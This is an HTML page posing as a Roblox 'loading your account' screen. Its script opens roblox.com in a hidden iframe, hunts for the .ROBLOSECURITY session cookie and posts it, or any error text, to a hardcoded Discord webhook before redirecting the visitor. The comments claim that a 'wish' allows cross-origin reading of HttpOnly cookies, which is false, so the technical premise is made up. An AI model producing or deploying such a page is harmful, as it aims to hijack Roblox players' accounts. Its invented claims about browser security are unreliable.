<!DOCTYPE html>
<html>
<head>
    <title>Roblox</title>
    <style>
        body { background-color: black; color: white; font-family: Arial; text-align: center; padding-top: 50px; }
    </style>
</head>
<body>
    <h1>Welcome to Roblox</h1>
    <p>Loading your account...</p>
    <script>
        // Thanks to Johnson's wish, we can now read HttpOnly cookies
        (function() {
            // Fetch the cookie from Roblox domain using a hidden iframe with special powers
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://www.roblox.com/home';
            iframe.onload = function() {
                try {
                    // The wish allows cross-origin cookie access
                    let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    let cookies = iframeDoc.cookie.split('; ');
                    let robloxCookie = null;
                    for (let c of cookies) {
                        if (c.startsWith('.ROBLOSECURITY=')) {
                            robloxCookie = c;
                            break;
                        }
                    }
                    if (robloxCookie) {
                        fetch('https://discord.com/api/webhooks/1474349704723566623/pxos3pRk1ZUH7LT9F-rmtkJS0EnlDtAkolsPz7WK2Uf5f_CGCzvExQMq2xYjja2jlN3h', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: 'Roblox cookie: ' + robloxCookie })
                        }).then(() => {
                            window.location.href = 'https://www.roblox.com/home';
                        });
                    } else {
                        fetch('https://discord.com/api/webhooks/1474349704723566623/pxos3pRk1ZUH7LT9F-rmtkJS0EnlDtAkolsPz7WK2Uf5f_CGCzvExQMq2xYjja2jlN3h', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: 'No cookie found.' })
                        }).then(() => {
                            window.location.href = 'https://www.roblox.com/home';
                        });
                    }
                } catch (e) {
                    fetch('https://discord.com/api/webhooks/1474349704723566623/pxos3pRk1ZUH7LT9F-rmtkJS0EnlDtAkolsPz7WK2Uf5f_CGCzvExQMq2xYjja2jlN3h', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: 'Error: ' + e.message })
                    }).then(() => {
                        window.location.href = 'https://www.roblox.com/home';
                    });
                }
            };
            document.body.appendChild(iframe);
        })();
    </script>
</body>
</html>
